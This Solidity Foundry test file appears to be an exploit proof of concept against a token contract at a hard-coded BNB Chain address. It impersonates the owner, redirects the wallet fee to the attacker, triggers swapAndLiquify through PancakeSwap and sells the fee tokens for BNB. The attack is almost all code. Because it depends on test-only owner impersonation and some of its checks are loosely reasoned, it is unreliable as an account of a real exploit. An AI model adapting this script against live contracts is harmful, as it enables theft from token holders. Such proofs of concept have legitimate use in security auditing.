pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IToken {
    function owner() external view returns (address);
    function setAllFeePercent(uint8 taxFee, uint8 liquidityFee, uint8 burnFee, uint8 walletFee, uint8 buybackFee) external;
    function setFeeWallet(address payable newFeeWallet) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function pcsV2Pair() external view returns (address);
    function numTokensSellToAddToLiquidity() external view returns (uint256);
    function _maxTxAmount() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x222f737285D0B60d8D4f27fA22cE8884c9F119F8;
    address attacker = address(this);
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the deployed contract at TARGET
        // We need to impersonate the owner to execute privileged functions
        address owner = IToken(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Label the target contract
        vm.label(TARGET, "Vulnerable Token");

        // Get the PancakeSwap pair address from the contract
        address pcsV2Pair = IToken(TARGET).pcsV2Pair();
        vm.label(pcsV2Pair, "PancakeSwap Pair");

        // Store initial attacker balance for comparison
        initialBalance = address(attacker).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate the owner to execute privileged functions
        address owner = IToken(TARGET).owner();
        vm.startPrank(owner);

        // Step 2: Set wallet fee to maximum 10%
        IToken(TARGET).setAllFeePercent(0, 0, 0, 10, 0);

        // Step 3: Set fee wallet to attacker address
        IToken(TARGET).setFeeWallet(payable(attacker));

        // Ensure swap and liquify is enabled (should be true by default)
        IToken(TARGET).setSwapAndLiquifyEnabled(true);

        vm.stopPrank();

        // Step 4: We need to become a token holder to trigger the fee collection
        // We'll buy tokens from PancakeSwap using BNB
        // First, give attacker some BNB
        deal(attacker, 10 ether);

        // Get the PancakeSwap router address (0x10ED43C718714eb63d5aA57B78B54704E256024E)
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IUniswapV2Router02 pcsRouter = IUniswapV2Router02(router);

        // Get WETH address
        address WETH = pcsRouter.WETH();

        // Prepare the swap path: WETH -> Token
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = TARGET;

        vm.startPrank(attacker);

        // Swap 1 ETH for tokens
        uint256 deadline = block.timestamp + 300;

        pcsRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0, // amountOutMin - Accept any amount for simplicity
            path,
            attacker,
            deadline
        );

        // Step 5: Now attacker has tokens, transfer to pair to trigger fee collection
        address pcsV2Pair = IToken(TARGET).pcsV2Pair();

        // Get attacker's token balance after purchase
        uint256 attackerTokenBalance = IToken(TARGET).balanceOf(attacker);

        // We need to transfer enough to trigger swapAndLiquify
        // Get the threshold amount
        uint256 numTokensSellToAddToLiquidity = IToken(TARGET).numTokensSellToAddToLiquidity();

        // Check maxTxAmount limit
        uint256 maxTxAmount = IToken(TARGET)._maxTxAmount();

        // Determine transfer amount - enough to trigger the mechanism
        uint256 transferAmount = numTokensSellToAddToLiquidity;
        if (transferAmount > maxTxAmount) {
            transferAmount = maxTxAmount;
        }
        if (transferAmount > attackerTokenBalance) {
            // If we don't have enough, use most of balance
            transferAmount = attackerTokenBalance * 9 / 10;
        }

        // Ensure we're transferring a non-zero amount
        require(transferAmount > 0, "Transfer amount must be greater than zero");

        // Store BNB balance before transfer to compare later
        uint256 balanceBeforeTransfer = address(attacker).balance;

        // Execute transfer to trigger fee collection
        IToken(TARGET).transfer(pcsV2Pair, transferAmount);

        // Step 6: Check if attacker received tokens from wallet fee
        uint256 tokenBalanceAfter = IToken(TARGET).balanceOf(attacker);
        require(tokenBalanceAfter > attackerTokenBalance - transferAmount, "Did not receive fee tokens");

        // Step 7: Sell the received tokens for BNB
        // Calculate how many tokens we received from fee
        uint256 feeTokensReceived = tokenBalanceAfter - (attackerTokenBalance - transferAmount);

        if (feeTokensReceived > 0) {
            // Approve router to spend tokens
            IToken(TARGET).approve(router, feeTokensReceived);

            // Prepare path: Token -> WETH
            address[] memory sellPath = new address[](2);
            sellPath[0] = TARGET;
            sellPath[1] = WETH;

            // Sell tokens for BNB
            pcsRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                feeTokensReceived,
                0, // Accept any amount
                sellPath,
                attacker,
                deadline
            );
        }

        vm.stopPrank();

        // Step 8: Check if attacker's BNB balance increased
        uint256 finalBalance = address(attacker).balance;
        require(finalBalance > balanceBeforeTransfer, "Attack failed: No BNB received after selling fee tokens");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

